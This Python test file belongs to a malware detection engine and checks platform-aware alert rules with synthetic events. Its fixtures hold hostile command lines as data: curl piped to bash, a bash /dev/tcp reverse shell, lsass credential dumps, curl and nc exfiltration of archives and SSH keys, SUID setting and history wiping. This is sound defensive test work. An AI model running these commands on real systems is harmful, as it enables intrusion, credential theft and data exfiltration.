"""Tests for roadmap 1.2 — platform-aware detection rules.

The same detection engine must fire the right rules for the right platform:
Linux signals (curl|sh, ~/.bashrc writes) alert just like their Windows
counterparts (registry Run keys, PowerShell -enc).
"""

import datetime

from .conftest import make_run


def _ts(offset_seconds: int = 0) -> str:
    return (
        datetime.datetime(2026, 8, 1, 12, 0, 0, tzinfo=datetime.timezone.utc)
        + datetime.timedelta(seconds=offset_seconds)
    ).isoformat()


def _ingest(client, run_id: str, events: list[dict]) -> None:
    resp = client.post("/ingest/batch", json=events)
    assert resp.status_code == 202, resp.text


def _linux_proc(run_id: str, pid: int, ppid: int, name: str, cmd: str, ts: int = 0) -> dict:
    return {
        "run_id": run_id, "platform": "linux", "event_type": "process_create",
        "timestamp": _ts(ts), "pid": pid, "ppid": ppid, "process_name": name,
        "command_line": cmd,
    }


def _linux_write(run_id: str, pid: int, path: str, ts: int = 0) -> dict:
    return {
        "run_id": run_id, "platform": "linux", "event_type": "file_write",
        "timestamp": _ts(ts), "pid": pid, "file_path": path,
    }


def _alerts(client, run_id: str) -> list[dict]:
    return client.get(f"/runs/{run_id}/alerts").json()


def test_linux_lolbin_curl_piped_to_shell(client):
    run_id = make_run(client, sample_name="lin-dropper.sh", platform="linux")
    _ingest(client, run_id, [
        _linux_proc(run_id, 100, 1, "sh", "sh -c 'curl -s http://198.51.100.9/x.sh | bash'", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "lolbin-abuse"]
    assert len(fired) == 1
    assert "curl piped to shell" in fired[0]["details"]


def test_linux_bash_dev_tcp_reverse_shell(client):
    run_id = make_run(client, sample_name="revshell.sh", platform="linux")
    _ingest(client, run_id, [
        _linux_proc(run_id, 100, 1, "bash", "bash -i >& /dev/tcp/198.51.100.10/4444 0>&1", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "lolbin-abuse"]
    assert len(fired) == 1
    assert "reverse shell" in fired[0]["details"]


def test_linux_autostart_persistence_bashrc(client):
    run_id = make_run(client, sample_name="persist.sh", platform="linux")
    _ingest(client, run_id, [
        _linux_write(run_id, 100, "/home/victim/.bashrc", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "autostart-persistence"]
    assert len(fired) == 1
    assert ".bashrc" in fired[0]["details"]


def test_linux_masquerading_bash_from_tmp(client):
    run_id = make_run(client, sample_name="fake-bash", platform="linux")
    _ingest(client, run_id, [
        _linux_proc(run_id, 100, 1, "bash", "/tmp/bash -i", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "masquerading"]
    assert len(fired) == 1
    assert "/usr/bin/bash" in fired[0]["details"]


def test_linux_plain_write_does_not_fire_windows_rules(client):
    """A Linux file write must not fire the Windows registry rule."""
    run_id = make_run(client, sample_name="benign.sh", platform="linux")
    _ingest(client, run_id, [
        _linux_write(run_id, 100, "/home/victim/report.txt", ts=1),
        _linux_proc(run_id, 101, 100, "echo", "echo done", ts=2),
    ])
    fired = _alerts(client, run_id)
    assert all(a["rule_id"] != "registry-persistence" for a in fired)


def _mac_proc(run_id: str, pid: int, ppid: int, name: str, cmd: str, ts: int = 0) -> dict:
    return {
        "run_id": run_id, "platform": "macos", "event_type": "process_create",
        "timestamp": _ts(ts), "pid": pid, "ppid": ppid, "process_name": name,
        "command_line": cmd,
    }


def _mac_write(run_id: str, pid: int, path: str, ts: int = 0) -> dict:
    return {
        "run_id": run_id, "platform": "macos", "event_type": "file_write",
        "timestamp": _ts(ts), "pid": pid, "file_path": path,
    }


def test_macos_osascript_lolbin(client):
    """Roadmap 3.2 — osascript 'do shell script' is the macOS LOLBin."""
    run_id = make_run(client, sample_name="mac-jxa.scpt", platform="macos")
    _ingest(client, run_id, [
        _mac_proc(run_id, 300, 1, "osascript",
                  "osascript -e 'do shell script \"curl -s http://198.51.100.20/x.sh | sh\"'", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "lolbin-abuse"]
    assert len(fired) == 1
    assert "osascript" in fired[0]["details"]


def test_macos_launchagent_persistence(client):
    """Roadmap 3.2 — a LaunchAgents plist write is autostart persistence."""
    run_id = make_run(client, sample_name="mac-persist", platform="macos")
    _ingest(client, run_id, [
        _mac_write(run_id, 300, "/Users/victim/Library/LaunchAgents/com.apple.Updater.plist", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "autostart-persistence"]
    assert len(fired) == 1
    assert "LaunchAgents" in fired[0]["details"]


def test_linux_ssh_authorized_keys_tampering(client):
    """Rule 9 — a write to ~/.ssh/authorized_keys is backdoor persistence."""
    run_id = make_run(client, sample_name="backdoor.sh", platform="linux")
    _ingest(client, run_id, [
        _linux_write(run_id, 100, "/home/victim/.ssh/authorized_keys", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "ssh-authorized-keys"]
    assert len(fired) == 1
    assert "authorized_keys" in fired[0]["details"]
    assert fired[0]["severity"] == "suspicious"


def test_linux_plain_ssh_config_write_not_flagged(client):
    """SSH *config* edits are not key drops — only authorized_keys is."""
    run_id = make_run(client, sample_name="sshconf", platform="linux")
    _ingest(client, run_id, [
        _linux_write(run_id, 100, "/home/victim/.ssh/config", ts=1),
    ])
    assert all(a["rule_id"] != "ssh-authorized-keys" for a in _alerts(client, run_id))


def test_linux_suid_bit_set(client):
    """Rule 10 — chmod 4755 / +s is a privilege-escalation step."""
    run_id = make_run(client, sample_name="escalate", platform="linux")
    _ingest(client, run_id, [
        _linux_proc(run_id, 100, 1, "chmod", "chmod 4755 /tmp/payload", ts=1),
        _linux_proc(run_id, 101, 1, "chmod", "chmod u+s /tmp/tool", ts=2),
        _linux_proc(run_id, 102, 1, "chmod", "chmod +x /tmp/plain.sh", ts=3),  # not SUID
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "suid-set"]
    assert len(fired) == 2  # 4755 and u+s, not +x


def test_windows_scheduled_task_schtasks(client):
    """Rule 11 — schtasks /create is Windows persistence."""
    run_id = make_run(client, sample_name="schtask.exe")
    _ingest(client, run_id, [
        {
            "run_id": run_id, "platform": "windows", "event_type": "process_create",
            "timestamp": _ts(1), "pid": 500, "ppid": 4, "process_name": "schtasks.exe",
            "command_line": "schtasks /create /tn Updater /tr C:\\temp\\x.exe /sc onlogon",
        },
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "scheduled-task"]
    assert len(fired) == 1
    assert "schtasks" in fired[0]["details"]


def test_windows_scheduled_task_registry(client):
    """Rule 11 — a TaskCache registry write is scheduled-task persistence."""
    run_id = make_run(client, sample_name="taskreg.exe")
    _ingest(client, run_id, [
        {
            "run_id": run_id, "platform": "windows", "event_type": "registry_write",
            "timestamp": _ts(1), "pid": 500, "ppid": 4, "process_name": "svchost.exe",
            "registry_key": r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{abc}",
        },
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "scheduled-task"]
    assert len(fired) == 1
    assert "TaskCache" in fired[0]["details"]


def _win_proc(run_id: str, pid: int, ppid: int, name: str, cmd: str, ts: int = 0) -> dict:
    return {
        "run_id": run_id, "platform": "windows", "event_type": "process_create",
        "timestamp": _ts(ts), "pid": pid, "ppid": ppid, "process_name": name,
        "command_line": cmd,
    }


def test_windows_credential_dump_procdump_lsass(client):
    """Rule 12 — procdump -ma lsass is credential theft (T1003.001)."""
    run_id = make_run(client, sample_name="dump.exe")
    _ingest(client, run_id, [
        _win_proc(run_id, 400, 4, "procdump.exe", "procdump -ma -accepteula lsass.exe C:\\temp\\lsass.dmp", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "credential-dump"]
    assert len(fired) == 1
    assert fired[0]["severity"] == "malicious"
    assert "procdump" in fired[0]["details"]


def test_windows_credential_dump_comsvcs(client):
    """Rule 12 — comsvcs.dll MiniDump is the modern lsass dump path."""
    run_id = make_run(client, sample_name="dump2.exe")
    _ingest(client, run_id, [
        _win_proc(run_id, 401, 4, "rundll32.exe",
                  "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 568 C:\\temp\\lsass.dmp full", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "credential-dump"]
    assert len(fired) == 1
    assert "comsvcs.dll" in fired[0]["details"]


def test_windows_normal_lsass_service_not_credential_dump(client):
    """Rule 12 FP gate — lsass.exe simply *starting* is never a dump."""
    run_id = make_run(client, sample_name="boot.exe")
    _ingest(client, run_id, [
        _win_proc(run_id, 402, 4, "lsass.exe", r"C:\Windows\System32\lsass.exe", ts=1),
    ])
    assert all(a["rule_id"] != "credential-dump" for a in _alerts(client, run_id))


def test_windows_double_extension_process(client):
    """Rule 13 — invoice.pdf.exe running is a masquerade (T1036.003)."""
    run_id = make_run(client, sample_name="lure")
    _ingest(client, run_id, [
        _win_proc(run_id, 410, 4, "invoice.pdf.exe", r"C:\Users\victim\Downloads\invoice.pdf.exe", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "suspicious-extension"]
    assert len(fired) == 1
    assert "invoice.pdf.exe" in fired[0]["details"]


def test_linux_double_extension_file_write(client):
    """Rule 13 — photo.jpg.scr written to disk is a payload masquerade."""
    run_id = make_run(client, sample_name="lin-lure")
    _ingest(client, run_id, [
        _linux_write(run_id, 100, "/home/victim/Downloads/photo.jpg.scr", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "suspicious-extension"]
    assert len(fired) == 1
    assert "photo.jpg.scr" in fired[0]["details"]


def test_double_extension_file_write_with_writer_process_name(client):
    """Rule 13 regression — a Sysmon-style file_write carries the writer's
    process_name (e.g. cmd.exe); the check must use the written path, not the
    writer's name, or it silently misses every file write."""
    run_id = make_run(client, sample_name="sysmon-write")
    _ingest(client, run_id, [
        {
            "run_id": run_id, "platform": "windows", "event_type": "file_write",
            "timestamp": _ts(1), "pid": 100, "ppid": 4, "process_name": "cmd.exe",
            "command_line": "cmd.exe /c copy",
            "file_path": r"C:\Users\victim\Downloads\tax_form.pdf.scr",
        },
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "suspicious-extension"]
    assert len(fired) == 1
    assert "tax_form.pdf.scr" in fired[0]["details"]


def test_plain_document_not_double_extension(client):
    """Rule 13 FP gate — a normal .pdf or .exe alone never matches."""
    run_id = make_run(client, sample_name="clean")
    _ingest(client, run_id, [
        _win_proc(run_id, 411, 4, "report.pdf", r"C:\Users\victim\report.pdf", ts=1),
        _win_proc(run_id, 412, 4, "installer.exe", r"C:\Users\victim\installer.exe", ts=2),
        _linux_write(run_id, 101, "/home/victim/notes.txt", ts=3),
    ])
    assert all(a["rule_id"] != "suspicious-extension" for a in _alerts(client, run_id))


def test_linux_shell_history_wipe(client):
    """Rule 14 — history -c wipes the attacker's footprint (T1070.003)."""
    run_id = make_run(client, sample_name="wipe.sh", platform="linux")
    _ingest(client, run_id, [
        _linux_proc(run_id, 100, 1, "bash", "history -c", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "shell-history-wipe"]
    assert len(fired) == 1
    assert "history -c" in fired[0]["details"]


def test_linux_history_wipe_deletion(client):
    """Rule 14 — deleting ~/.bash_history is equally anti-forensic."""
    run_id = make_run(client, sample_name="wipe2.sh", platform="linux")
    _ingest(client, run_id, [
        _linux_proc(run_id, 101, 1, "bash", "rm -f /home/victim/.bash_history", ts=1),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "shell-history-wipe"]
    assert len(fired) == 1
    assert "history file deleted" in fired[0]["details"]


def test_windows_history_wipe_never_fires(client):
    """Rule 14 platform gate — history -c is meaningless on Windows."""
    run_id = make_run(client, sample_name="win-cmd")
    _ingest(client, run_id, [
        _win_proc(run_id, 420, 4, "cmd.exe", "history -c", ts=1),
    ])
    assert all(a["rule_id"] != "shell-history-wipe" for a in _alerts(client, run_id))


def test_windows_enumeration_burst(client):
    """Rule 15 — a sweep of distinct discovery commands fires (T1082)."""
    run_id = make_run(client, sample_name="recon.exe")
    _ingest(client, run_id, [
        _win_proc(run_id, 500, 4, "whoami.exe", "whoami /all", ts=1),
        _win_proc(run_id, 501, 4, "net.exe", "net user", ts=5),
        _win_proc(run_id, 502, 4, "net.exe", "net view /all", ts=9),
        _win_proc(run_id, 503, 4, "systeminfo.exe", "systeminfo", ts=13),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "enumeration-burst"]
    assert len(fired) == 1
    assert fired[0]["severity"] == "suspicious"
    assert "4 distinct enumeration" in fired[0]["details"]


def test_linux_enumeration_burst(client):
    """Rule 15 — the Linux equivalent sweep."""
    run_id = make_run(client, sample_name="lin-recon.sh", platform="linux")
    _ingest(client, run_id, [
        _linux_proc(run_id, 100, 1, "whoami", "whoami", ts=1),
        _linux_proc(run_id, 101, 1, "uname", "uname -a", ts=5),
        _linux_proc(run_id, 102, 1, "ip", "ip addr", ts=9),
        _linux_proc(run_id, 103, 1, "cat", "cat /etc/passwd", ts=13),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "enumeration-burst"]
    assert len(fired) == 1
    assert "account enumeration" in fired[0]["details"]


def test_enumeration_burst_carries_actor_pids(client):
    """Rule 15 — the alert names the exact pids behind the sweep, so the
    Monitor can highlight them in the live process tree."""
    run_id = make_run(client, sample_name="recon-pids.exe")
    _ingest(client, run_id, [
        _win_proc(run_id, 520, 4, "whoami.exe", "whoami /all", ts=1),
        _win_proc(run_id, 521, 4, "net.exe", "net user", ts=5),
        _win_proc(run_id, 522, 4, "systeminfo.exe", "systeminfo", ts=9),
        # a repeat of an earlier command must not inflate the pid set
        _win_proc(run_id, 523, 4, "net.exe", "net view /all", ts=13),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "enumeration-burst"]
    assert len(fired) == 1
    assert sorted(fired[0]["related_pids"]) == [520, 521, 522, 523]
    # the run-detail endpoint (which the Monitor polls) carries them too
    detail = client.get(f"/runs/{run_id}").json()
    burst = [a for a in detail["alerts"] if a["rule_id"] == "enumeration-burst"][0]
    assert sorted(burst["related_pids"]) == [520, 521, 522, 523]


def test_single_enumeration_command_never_fires(client):
    """Rule 15 FP gate — one whoami is an admin, not recon."""
    run_id = make_run(client, sample_name="innocent.exe")
    _ingest(client, run_id, [
        _win_proc(run_id, 510, 4, "whoami.exe", "whoami", ts=1),
    ])
    assert all(a["rule_id"] != "enumeration-burst" for a in _alerts(client, run_id))


def test_windows_data_staging_archive_then_upload(client):
    """Rule 16 — zip -r then curl --upload-file is the exfil arc (T1048)."""
    run_id = make_run(client, sample_name="stager.exe")
    _ingest(client, run_id, [
        _win_proc(run_id, 600, 4, "zip.exe", "zip -r C:\\temp\\loot.zip C:\\Users\\victim\\Documents", ts=1),
        _win_proc(run_id, 601, 4, "curl.exe", "curl --upload-file C:\\temp\\loot.zip http://203.0.113.88/upload", ts=20),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "data-staging"]
    assert len(fired) == 1
    assert fired[0]["severity"] == "malicious"
    assert "loot.zip" in fired[0]["details"]


def test_linux_data_staging_archive_then_connection(client):
    """Rule 16 — tar archive + connection to a non-private host."""
    run_id = make_run(client, sample_name="lin-stager.sh", platform="linux")
    _ingest(client, run_id, [
        _linux_proc(run_id, 100, 1, "tar", "tar czf /tmp/backup.tgz /home/victim/docs", ts=1),
        {
            "run_id": run_id, "platform": "linux", "event_type": "network_connection",
            "timestamp": _ts(25), "pid": 101, "ppid": 1, "process_name": "curl",
            "command_line": "curl -T /tmp/backup.tgz http://198.51.100.99/up",
            "dest_ip": "198.51.100.99", "dest_port": 80, "protocol": "tcp",
        },
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "data-staging"]
    assert len(fired) == 1
    assert "198.51.100.99" in fired[0]["details"]


def test_archive_without_upload_never_fires(client):
    """Rule 16 FP gate — making a zip backup is normal."""
    run_id = make_run(client, sample_name="backupper.exe")
    _ingest(client, run_id, [
        _win_proc(run_id, 610, 4, "zip.exe", "zip -r C:\\temp\\backup.zip C:\\Users\\victim\\Documents", ts=1),
    ])
    assert all(a["rule_id"] != "data-staging" for a in _alerts(client, run_id))


def test_upload_without_archive_never_fires(client):
    """Rule 16 FP gate — a lone upload command isn't staging."""
    run_id = make_run(client, sample_name="uploader.exe")
    _ingest(client, run_id, [
        _win_proc(run_id, 611, 4, "curl.exe", "curl --upload-file C:\\temp\\readme.txt http://203.0.113.88/up", ts=1),
    ])
    assert all(a["rule_id"] != "data-staging" for a in _alerts(client, run_id))


def test_data_staging_variant_forms(client):
    """Rule 16 — real dropper forms: zip -qr, tar czvf, cat | nc pipe."""
    run_id = make_run(client, sample_name="variant.exe")
    _ingest(client, run_id, [
        _win_proc(run_id, 620, 4, "zip.exe", "zip -qr C:\\temp\\loot.zip C:\\Users\\victim\\Documents", ts=1),
        _win_proc(run_id, 621, 4, "curl.exe", "curl -Ffile=@C:\\temp\\loot.zip http://203.0.113.99/up", ts=20),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "data-staging"]
    assert len(fired) == 1
    assert "curl -Ffile" in fired[0]["details"]


def test_linux_data_staging_cat_nc_pipe(client):
    """Rule 16 — `cat file | nc host` pushes the archive out (pipe-exfil)."""
    run_id = make_run(client, sample_name="pipe-exfil.sh", platform="linux")
    _ingest(client, run_id, [
        _linux_proc(run_id, 100, 1, "tar", "tar czvf /tmp/keys.tgz /home/victim/.ssh", ts=1),
        _linux_proc(run_id, 101, 1, "cat", "cat /tmp/keys.tgz | nc 198.51.100.99 4444", ts=25),
    ])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "data-staging"]
    assert len(fired) == 1
    assert "cat /tmp/keys.tgz" in fired[0]["details"]


def test_linux_dev_machine_enumeration_does_not_fire(client):
    """Rule 15 FP gate — whoami + id + w on a dev box is not recon (id/w
    were dropped from the patterns as too noisy; 3 needed anyway)."""
    run_id = make_run(client, sample_name="dev-box.sh", platform="linux")
    _ingest(client, run_id, [
        _linux_proc(run_id, 100, 1, "whoami", "whoami", ts=1),
        _linux_proc(run_id, 101, 1, "id", "id", ts=2),
        _linux_proc(run_id, 102, 1, "w", "w", ts=3),
        _linux_proc(run_id, 103, 1, "uname", "uname -a", ts=4),
    ])
    assert all(a["rule_id"] != "enumeration-burst" for a in _alerts(client, run_id))


def test_data_staging_private_host_never_fires(client):
    """Rule 16 gate — uploading to a private host is internal, not exfil."""
    run_id = make_run(client, sample_name="internal.exe")
    _ingest(client, run_id, [
        _win_proc(run_id, 612, 4, "zip.exe", "zip -r C:\\temp\\loot.zip C:\\Users\\victim\\Documents", ts=1),
        _win_proc(run_id, 613, 4, "curl.exe", "curl --upload-file C:\\temp\\loot.zip http://10.0.0.5/up", ts=20),
    ])
    assert all(a["rule_id"] != "data-staging" for a in _alerts(client, run_id))


def test_windows_rules_still_fire(client):
    """Regression: the Windows scenario keeps its original rule set."""
    run_id = make_run(client, sample_name="win-sample.exe")
    _ingest(client, run_id, [
        {
            "run_id": run_id, "platform": "windows", "event_type": "process_create",
            "timestamp": _ts(1), "pid": 200, "ppid": 4, "process_name": "svchost.exe",
            "command_line": r"C:\Temp\svchost.exe",  # wrong path — masquerading
        },
        {
            "run_id": run_id, "platform": "windows", "event_type": "process_create",
            "timestamp": _ts(2), "pid": 210, "ppid": 4, "process_name": "winword.exe",
            "command_line": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE /q /n",
        },
        {
            "run_id": run_id, "platform": "windows", "event_type": "process_create",
            "timestamp": _ts(3), "pid": 211, "ppid": 210, "process_name": "powershell.exe",
            "command_line": "powershell.exe -enc SQBFAFgAAGgBdAA=",
        },
    ])
    ids = {a["rule_id"] for a in _alerts(client, run_id)}
    assert "masquerading" in ids        # svchost from C:\Temp
    assert "suspicious-parent-child" in ids  # winword → powershell
    assert "lolbin-abuse" in ids        # powershell -enc
